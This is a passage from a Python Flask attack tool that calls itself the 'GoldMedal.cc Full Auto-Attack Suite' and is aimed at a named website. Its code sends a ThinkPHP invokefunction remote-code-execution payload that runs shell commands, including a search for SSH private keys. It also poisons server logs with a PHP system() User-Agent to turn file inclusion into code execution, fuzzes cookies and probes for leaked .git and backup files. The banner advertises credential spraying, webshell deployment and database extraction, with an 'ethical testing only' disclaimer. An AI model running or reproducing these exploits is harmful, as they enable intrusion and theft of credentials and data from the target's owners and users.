        'find / -name "id_rsa" -o -name "*.pem" 2>/dev/null | head -10',
    ]
    
    results = []
    for cmd in commands:
        try:
            payload = f"/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}"
            r = requests.get(f"{TARGET}{payload}", timeout=15, verify=False)
            increment_request_count()
            if r.status_code == 200 and len(r.text) > 10:
                results.append({'command': cmd, 'output': r.text[:500]})
                # Look for SSH keys
                if 'ssh-rsa' in r.text or 'PRIVATE KEY' in r.text:
                    add_to_attack_state('discovered_credentials', ['SSH_KEY_FOUND'])
        except:
            pass
    
    return results

def _deep_rce_exploitation_sync():
    """Synchronous deep RCE exploitation"""
    return _explore_filesystem_deep()

def _lfi_to_rce_sync():
    """Attempt LFI to RCE escalation"""
    results = []
    
    for lfi in attack_state['lfi_vulnerabilities'][:5]:
        # Try log poisoning
        try:
            # Inject PHP code into User-Agent
            headers = {'User-Agent': '<?php system($_GET["cmd"]); ?>'}
            r = requests.get(TARGET, headers=headers, timeout=10, verify=False)
            increment_request_count()
            
            # Try to include the log file
            log_paths = [
                '/var/log/nginx/access.log',
                '/var/log/apache2/access.log',
                '/var/log/httpd/access_log',
            ]
            
            for log_path in log_paths:
                try:
                    r = requests.get(f"{TARGET}?file={log_path}&cmd=id", timeout=10, verify=False)
                    increment_request_count()
                    if 'uid=' in r.text:
                        results.append({'technique': 'log_poisoning', 'log_file': log_path, 'success': True})
                        attack_state['rce_verified'] = True
                except:
                    pass
        except:
            pass
    
    return results

def _exploit_sqli_sync():
    """Synchronous SQLi exploitation"""
    return sqli_scan().get_json() if hasattr(sqli_scan(), 'get_json') else {'results': []}

def _spray_credentials_sync():
    """Synchronous credential spraying"""
    return _spray_credentials()

def _attack_all_services_sync():
    """Synchronous service attack"""
    return _exploit_services_internal()

# ============================================================
# EXISTING ENDPOINTS (Preserved and enhanced)
# ============================================================
@app.route('/hunt/thinkphp-config')
def thinkphp_config():
    """ThinkPHP config extraction"""
    return jsonify(_extract_configs())

@app.route('/hunt/git-leak')
def git_leak():
    """.git leak detection"""
    return jsonify(_scan_git_internal())

@app.route('/hunt/backup-files')
def backup_files():
    """Backup file discovery"""
    return jsonify(_scan_backups_internal())

@app.route('/hunt/bt-panel')
def bt_panel_check():
    """BT Panel detection"""
    return jsonify(_attack_bt_panel_internal())

@app.route('/hunt/headers')
def check_headers():
    """Security headers analysis"""
    return jsonify(_check_headers_internal())

@app.route('/hunt/api-discovery')
def api_discovery():
    """API endpoint discovery"""
    return jsonify(_discover_all_endpoints())

@app.route('/hunt/vue-routes')
def test_vue_routes():
    """Vue route testing"""
    routes = [
        '/index.html#/login', '/index.html#/register/1',
        '/index.html#/wallet', '/index.html#/recharge',
        '/index.html#/user', '/index.html#/admin',
    ]
    
    results = []
    for route in routes:
        try:
            r = requests.get(f"{TARGET}{route}", timeout=10, verify=False, allow_redirects=False)
            increment_request_count()
            results.append({
                'route': route,
                'status': r.status_code,
                'length': len(r.text),
                'accessible': r.status_code == 200
            })
        except:
            pass
    
    return jsonify(results)

@app.route('/hunt/idor-test')
def idor_test():
    """IDOR testing"""
    return jsonify({'status': 'IDOR testing integrated into auto-attack chain'})

@app.route('/hunt/extract-js')
def extract_js():
    """JavaScript analysis"""
    return jsonify({'status': 'JS extraction integrated into proxy auto-discovery'})

@app.route('/hunt/vue-inspect')
def vue_inspect():
    """Vue.js inspector commands"""
    return jsonify({
        'commands': [
            'var app = document.querySelector("#app").__vue__',
            'console.log("Store:", app.$store?.state)',
            'console.log("Router:", app.$router?.options.routes)',
            'console.log("User:", app.$store?.state?.user)',
            'console.log("Token:", app.$store?.state?.token)',
        ]
    })

@app.route('/hunt/desktop-bypass')
def desktop_bypass():
    """Desktop mode bypass testing"""
    try:
        mobile_r = requests.get(TARGET, headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}, timeout=10, verify=False)
        desktop_r = requests.get(TARGET, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, timeout=10, verify=False)
        increment_request_count()
        increment_request_count()
        
        return jsonify({
            'mobile_length': len(mobile_r.text),
            'desktop_length': len(desktop_r.text),
            'different': len(mobile_r.text) != len(desktop_r.text),
            'potential_bypass': len(desktop_r.text) > len(mobile_r.text)
        })
    except:
        return jsonify({'error': 'Failed'})

@app.route('/test/cookie/<value>')
def test_cookie(value):
    """Test individual cookie"""
    encoded = base64.b64encode(value.encode()).decode()
    try:
        r = requests.get(f"{TARGET}/index.php", cookies={'username': encoded}, timeout=10, verify=False)
        increment_request_count()
        return jsonify({
            'value_tested': value,
            'encoded_cookie': encoded,
            'status': r.status_code,
            'length': len(r.text),
            'different_from_default': len(r.text) > 500
        })
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/hunt/cookie-fuzz')
def cookie_fuzz():
    """Cookie fuzzing"""
    return jsonify(_comprehensive_cookie_test())

# ============================================================
# HEALTH CHECK
# ============================================================
@app.route('/health')
def health():
    return jsonify({
        'status': 'operational',
        'timestamp': datetime.now().isoformat(),
        'target': TARGET,
        'target_ip': TARGET_IP,
        'attack_state_summary': {
            'total_requests': attack_state['total_requests_sent'],
            'rce_achieved': attack_state['rce_verified'],
            'open_ports': len(attack_state['open_ports']),
            'vulnerabilities_found': len(attack_state['attack_history']),
            'successful_exploits': attack_state['successful_exploits'],
            'modules_available': {
                'paramiko': PARAMIKO_AVAILABLE,
                'pymysql': PYMYSQL_AVAILABLE,
                'redis': REDIS_AVAILABLE,
                'pymongo': PYMONGO_AVAILABLE,
                'psycopg2': PSYCOPG2_AVAILABLE,
                'ftplib': FTP_AVAILABLE,
            }
        }
    })

@app.route('/clear-cache')
def clear_cache():
    """Clear request cache"""
    cache.clear()
    return jsonify({'message': 'Cache cleared'})

# ============================================================
# STARTUP
# ============================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    print(f"""
╔══════════════════════════════════════════════════════╗
║   ⚡ GoldMedal.cc Full Auto-Attack Suite v4.0       ║
║                                                      ║
║   Port: {port}                                       ║
║   Target: {TARGET}                    ║
║   Target IP: {TARGET_IP}                           ║
║                                                      ║
║   Features:                                          ║
║   • Full Auto-Attack Chain                           ║
║   • Service Exploitation (SSH/FTP/MySQL/Redis)       ║
║   • RCE Auto-Exploitation                            ║
║   • LFI/SQLi/XSS/SSRF/SSTI Scanning                  ║
║   • Credential Spraying                              ║
║   • Webshell Deployment                              ║
║   • Database Extraction                              ║
║   • Lateral Movement                                 ║
║   • Persistence Detection                            ║
║                                                      ║
║   Available Modules:                                 ║
║   • paramiko: {str(PARAMIKO_AVAILABLE):<10}                    ║
║   • pymysql: {str(PYMYSQL_AVAILABLE):<11}                    ║
║   • redis: {str(REDIS_AVAILABLE):<13}                    ║
║   • pymongo: {str(PYMONGO_AVAILABLE):<11}                    ║
║   • psycopg2: {str(PSYCOPG2_AVAILABLE):<10}                    ║
║                                                      ║
║   ⚠️  ETHICAL TESTING ONLY - OWN ENVIRONMENT         ║
╚══════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=port, debug=False)
